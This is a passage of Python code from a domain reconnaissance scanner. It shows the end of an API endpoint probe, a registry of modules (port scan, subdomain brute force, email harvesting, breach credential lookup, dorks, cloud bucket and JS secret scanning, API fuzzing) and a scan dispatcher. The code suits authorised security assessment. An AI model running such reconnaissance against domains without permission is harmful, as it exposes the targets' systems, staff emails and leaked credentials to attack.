                if _api_ca_status is not None and r.status_code == _api_ca_status \
                   and abs(len(r.content) - _api_ca_size) <= max(32, _api_ca_size * 0.10):
                    return
                if _looks_soft_404(r):
                    return
                if r.status_code in (200, 401, 403, 405, 422):
                    actual = sev
                    if r.status_code in (401, 403):
                        actual = {"critical": "high", "high": "medium",
                                  "medium": "low"}.get(sev, sev)
                    with _lock:
                        result["endpoints"].append({
                            "path":     f"{result['base_found']}{path}",
                            "name":     name,
                            "severity": actual,
                            "status":   r.status_code,
                            "json":     "json" in r.headers.get("Content-Type", ""),
                            "size":     len(r.content),
                        })
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
            list(ex.map(check_ep, ENDPOINTS))

        # Final safety net: many endpoints sharing one status AND size are the
        # same generic response, not distinct endpoints.
        result["endpoints"] = _drop_uniform_findings(result["endpoints"], min_group=6)

        result["endpoints"].sort(
            key=lambda x: {"critical": 0, "high": 1, "medium": 2,
                           "low": 3, "info": 4}.get(x["severity"], 5)
        )

    result["total"] = (len(result["endpoints"]) + len(result["specs"])
                       + len(result["discovered"]) + (1 if result["graphql"] else 0))
    if result["total"] == 0:
        result["error"] = "No API surface detected (no base, specs, GraphQL or JS-referenced routes)"
    return result


ALL_MODULES = {
    "screenshot":      ("Website Screenshot",                    scan_screenshot),
    "dns":             ("DNS Records + Email Security",          scan_dns),
    "geo":             ("IP Geolocation & ASN",                  scan_geo),
    "whois":           ("WHOIS / RDAP Registration",             scan_whois),
    "ssl":             ("SSL/TLS Certificate",                   scan_ssl),
    "headers":         ("HTTP Security Headers",                 scan_headers),
    "wafw00f":         ("WAF Detection",      scan_wafw00f),
    "ports":           ("Port Scan (70+ ports + banners)",       scan_ports),
    "whatweb":         ("WhatWeb Deep Tech Detection",           scan_whatweb),
    "robots":          ("Robots/Security/Sitemap",               scan_robots),
    "endpoints":       ("Sensitive Endpoints (80+ paths)",       scan_endpoints),
    "nuclei":          ("Vulnerability Scanner (358 checks)",    scan_nuclei),
    "shodan":          ("Shodan InternetDB + CVEs",              scan_shodan),
    "censys":          ("Censys Hosts + Certificates",           scan_censys),
    "subdomains":      ("Subdomain Discovery", scan_subdomains),
    "brute":           ("Subdomain Brute Force",                 scan_bruteforce),
    "wayback":         ("Wayback Machine Archives",              scan_wayback),
    "email_harvest":   ("Email Harvester (open-source, no key)", scan_email_harvest),
    "breachintel":     ("Breach & Credential Intelligence",      scan_breachintel),
    "dorks":           ("Google Dorks (61)",                     generate_dorks),
    "osint":           ("OSINT Platform URLs (26)",              generate_osint_urls),
    "favicon":         ("Favicon Hash Fingerprinting",          scan_favicon),
    "cloud_buckets":   ("Cloud Bucket Finder (S3/Azure/GCP)",  scan_cloud_buckets),
    "js_secrets":      ("JS Secret Scanner",                   scan_js_secrets),
    "content_intel":   ("Content Intel (JS/HTML URL & info extractor)", scan_content_intel),
    "http_inspect":    ("HTTP Inspector (request/response headers)", scan_http_inspect),
    "api_fuzzer":      ("API Endpoint Fuzzer",                  scan_api_fuzzer),
}

FAST_SKIP = {"wayback", "brute", "subdomains", "screenshot", "email_harvest",
             "nuclei", "cloud_buckets"}  # slow modules skipped in fast mode

def run_scan(domain, modules=None, fast=False, callback=None):
    """Run scan modules. callback(module_name, description, result) called per module."""
    domain = clean_domain(domain)
    if not domain:
        return None

    if modules:
        to_run = {k: v for k, v in ALL_MODULES.items() if k in modules}
    elif fast:
        to_run = {k: v for k, v in ALL_MODULES.items() if k not in FAST_SKIP}
    else:
        to_run = ALL_MODULES

    results = {}
    # Cache of ports discovered by Shodan/Censys to enrich port scan
    intel_ports = set()

    for key, (desc, func) in to_run.items():
        try:
            # Inject Shodan/Censys ports into scan_ports if we have them
            if key == "ports":
                result = scan_ports(domain, extra_ports=intel_ports if intel_ports else None)
            else:
                result = func(domain)

            results[key] = result

            # Collect ports from Shodan/Censys for later port scan enrichment
            if key == "shodan":
                for ip_data in result.get("ips", {}).values():
                    for p in (ip_data.get("ports") or []):
                        if isinstance(p, int):
                            intel_ports.add(p)
            elif key == "censys":
                for ip_data in result.get("ip_data", {}).values():
                    for p in (ip_data.get("ports") or []):
                        if isinstance(p, int):
                            intel_ports.add(p)

            if callback:
                callback(key, desc, result)
        except Exception as e:
            results[key] = {"error": str(e)}
            if callback:
                callback(key, desc, {"error": str(e)})

    return results
